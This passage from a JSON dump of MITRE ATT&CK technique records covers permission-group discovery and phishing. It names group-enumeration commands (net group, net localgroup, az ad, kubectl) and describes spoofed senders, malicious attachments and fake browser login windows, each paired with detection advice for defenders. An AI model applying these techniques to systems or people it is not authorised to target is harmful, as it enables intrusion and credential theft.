2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto T9000 Feb 2016),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Unit42 Redaman January 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: Forcepoint Monsoon),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: FireEye WannaCry 2017),(Citation: Fidelis njRAT June 2013),(Citation: ESET Operation Groundbait),(Citation: Kaspersky Equation QA),(Citation: Microsoft SIR Vol 19),(Citation: ESET ComRAT May 2020),(Citation: ESET Attor Oct 2019),(Citation: ESET RTM Feb 2017),(Citation: Kaspersky TajMahal April 2019),(Citation: Eset Ramsay May 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: Microsoft Actinium February 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Sednit Part 2),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ESET Crutch December 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Proofpoint TA505 Mar 2018),(Citation: Securelist ScarCruft May 2019),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Sophos Ragnar May 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Gamaredon June 2020),(Citation: Symantec Chafer Dec 2015),(Citation: Talos Oblique RAT March 2021),(Citation: Sentinel Labs WastedLocker July 2020),"}
{"ID":"T1069","name":"Permission Groups Discovery","description":"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)","url":"https://attack.mitre.org/techniques/T1069","created":"31 May 2017","last modified":"15 April 2023","version":"2.5","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Monitor container logs for commands and/or API calls related to listing permissions for pods and nodes, such as <code>kubectl auth can-i</code>.(Citation: K8s Authorization Overview)","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Daniel Prizmant, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Yuval Avrahami, Palo Alto Networks","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro TA505 June 2019),(Citation: FireEye Periscope March 2018),(Citation: Volexity SolarWinds),(Citation: GovCERT Carbon May 2016),(Citation: IBM IcedID November 2017),(Citation: Symantec Buckeye),(Citation: Cyberreason Anchor December 2019),(Citation: IBM TA505 April 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Unit 42 Siloscape Jun 2021),"}
{"ID":"T1069.003","name":"Permission Groups Discovery: Cloud Groups","description":"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.","url":"https://attack.mitre.org/techniques/T1069/003","created":"21 February 2020","last modified":"21 March 2023","version":"1.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1069","defenses bypassed":null,"contributors":"Isif Ibrahima, Mandiant; Regina Elwell","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Roadtools),(Citation: AADInternals Documentation),"}
{"ID":"T1069.002","name":"Permission Groups Discovery: Domain Groups","description":"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.","url":"https://attack.mitre.org/techniques/T1069/002","created":"21 February 2020","last modified":"07 April 2023","version":"1.2","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1069","defenses bypassed":null,"contributors":"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Kaspersky Sodin July 2019),(Citation: Secureworks REvil September 2019),(Citation: Symantec Orangeworm April 2018),(Citation: McAfee Sodinokibi October 2019),(Citation: Intrinsec Egregor Nov 2020),(Citation: Symantec Buckeye),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Unit 42 Playbook Dec 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: TechNet Dsquery),(Citation: US-CERT TA18-074A),(Citation: CISA WellMess July 2020),(Citation: CME Github September 2018),(Citation: CISA SoreFang July 2016),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: SecureList Griffon May 2019),(Citation: Microsoft BlackCat Jun 2022),(Citation: Mandiant APT41),(Citation: FireEye FIN6 Apr 2019),(Citation: Palo Alto OilRig May 2016),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ESET ComRAT May 2020),(Citation: Symantec Bumblebee June 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Savill 1999),(Citation: FireEye APT34 Dec 2017),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CrowdStrike BloodHound April 2018),(Citation: Symantec Inception Framework March 2018),(Citation: Trend Micro Black Basta October 2022),"}
{"ID":"T1069.001","name":"Permission Groups Discovery: Local Groups","description":"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.","url":"https://attack.mitre.org/techniques/T1069/001","created":"12 March 2020","last modified":"07 April 2023","version":"1.2","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1069","defenses bypassed":null,"contributors":"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Symantec Buckeye),(Citation: Kaspersky Turla Aug 2014),(Citation: FoxIT Wocao December 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Kaspersky QakBot September 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Korean FSI TA505 2020),(Citation: Baumgartner Naikon 2015),(Citation: FireEye admin@338),(Citation: Unit 42 Kazuar May 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: GitHub PoshC2),(Citation: Palo Alto OilRig May 2016),(Citation: TrendMicro Tonto Team October 2020),(Citation: ESET ComRAT May 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Savill 1999),(Citation: FireEye APT34 Dec 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CrowdStrike BloodHound April 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: NTT Security Flagpro new December 2021),(Citation: Emissary Trojan Feb 2016),(Citation: Trend Micro Black Basta October 2022),"}
{"ID":"T1566","name":"Phishing","description":"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)","url":"https://attack.mitre.org/techniques/T1566","created":"02 March 2020","last modified":"14 April 2023","version":"2.3","tactics":"Initial Access","detection":"Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","platforms":"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Liora Itkin; Liran Ravich, CardinalOps; Ohad Zaidenberg, @ohad_mz; Philip Winther; Scott Cook, Capital One","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Group 72),(Citation: Cybereason Royal December 2022),(Citation: Secureworks REvil September 2019),(Citation: Kroll Royal Deep Dive February 2023),(Citation: CISA Royal AA23-061A March 2023),(Citation: Novetta-Axiom),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1598","name":"Phishing for Information","description":"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)","url":"https://attack.mitre.org/techniques/T1598","created":"02 October 2020","last modified":"14 April 2023","version":"1.2","tactics":"Reconnaissance","detection":"Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nWhen it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.\n\nMonitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).","platforms":"PRE","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Liora Itkin; Liran Ravich, CardinalOps; Ohad Zaidenberg, @ohad_mz; Philip Winther; Robert Simmons, @MalwareUtkonos; Scott Cook, Capital One; Sebastian Salla, McAfee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Google Election Threats October 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Microsoft Targeting Elections September 2020),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1598.002","name":"Phishing for Information: Spearphishing Attachment","description":"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","url":"https://attack.mitre.org/techniques/T1598/002","created":"02 October 2020","last modified":"15 April 2021","version":"1.1","tactics":"Reconnaissance","detection":"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)","platforms":"PRE","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1598","defenses bypassed":null,"contributors":"Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ATT Sidewinder January 2021),(Citation: US-CERT TA18-074A),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cyble Sidewinder September 2020),(Citation: Rewterz Sidewinder APT April 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1598.003","name":"Phishing for Information: Spearphishing Link","description":"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site.\n\nAdversaries may also link to \"web bugs\" or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","url":"https://attack.mitre.org/techniques/T1598/003","created":"02 October 2020","last modified":"15 April 2023","version":"1.4","tactics":"Reconnaissance","detection":"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nMonitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.","platforms":"PRE","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1598","defenses bypassed":null,"contributors":"Elpidoforos Maragkos, @emaragkos; Joas Antonio dos Santos, @C0d3Cr4zy; Menachem Goldstein; Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Certfa Charming Kitten January 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Volexity Patchwork June 2018),(Citation: Proofpoint TA453 July2021),(Citation: Proofpoint TA453 March 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: ATT Sidewinder January 2021),(Citation: US-CERT TA18-074A),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Microsoft Targeting Elections September 2020),(Citation: VirusBulletin Kimsuky October 2019),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: AADInternals Documentation),(Citation: Phish Labs Silent Librarian),(Citation: Proofpoint TA407 September 2019),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: KISA Operation Muzabi),(Citation: DOJ Iran Indictments March 2018),(Citation: Google Iran Threats October 2021),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1598.001","name":"Phishing for Information: Spearphishing Service","description":"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","url":"https://attack.mitre.org/techniques/T1598/001","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1598","defenses bypassed":null,"contributors":"Robert Simmons, @MalwareUtkonos","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1566.001","name":"Phishing: Spearphishing Attachment","description":"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ","url":"https://attack.mitre.org/techniques/T1566/001","created":"02 March 2020","last modified":"30 March 2023","version":"2.2","tactics":"Initial Access","detection":"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1566","defenses bypassed":null,"contributors":"Philip Winther","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: FireEye Obfuscation June 2017),(Citation: Secureworks REvil September 2019),(Citation: Mandiant APT1),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Group IB Silence Sept 2018),(Citation: HackerNews IndigoZebra July 2021),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: RiskIQ Cobalt Nov 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: Trend Micro DRBControl February 2020),(Citation: FireEye APT32 April 2020),(Citation: CSM Elderwood Sept 2012),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Symantec Tick Apr 2016),(Citation: MSTIC NOBELIUM May 2021),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: Proofpoint TA505 June 2018),(Citation: ATT Sidewinder January 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: DOJ GRU Indictment Jul 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: SecureWorks August 2019),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: ESET OceanLotus),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Unit 42 Phishery Aug 2018),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: McAfee Lazarus Jul 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Symantec Gallmaker Oct 2018),(Citation: Unit 42 NETWIRE April 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: SecureList Silence Nov 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Juniper IcedID June 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Microsoft Actinium February 2022),(Citation: Sofacy DealersChoice),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: KISA Operation Muzabi),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Zdnet Kimsuky Dec 2018),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Group IB RTM August 2019),(Citation: Talos Bisonal Mar 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Securelist Darkhotel Aug 2015),(Citation: US-CERT Emotet Jul 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Talos Cobalt Group July 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Picus Emotet Dec 2018),(Citation: TrendMicro 